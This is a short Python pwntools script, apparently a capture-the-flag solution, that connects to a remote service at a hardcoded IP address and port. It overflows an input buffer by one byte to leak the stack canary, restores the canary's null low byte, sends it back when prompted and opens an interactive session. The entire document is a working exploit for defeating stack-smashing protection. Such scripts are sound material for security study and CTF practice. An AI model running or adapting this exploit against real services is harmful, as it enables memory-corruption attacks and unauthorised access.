from pwn import *

p = remote("34.170.146.252", 53934)

p.sendafter(b"Input:\n", b"a"*0xc9)

p.recvuntil(b"Output:\n")
p.recvuntil(b"a"*0xc8)
canary = u64(p.recvline().strip()[:8])
log.info(hex(canary))
canary = canary & 0xffffffffffffff00
log.info(hex(canary))

p.sendafter(b"Canary?\n", p64(canary))

p.interactive()
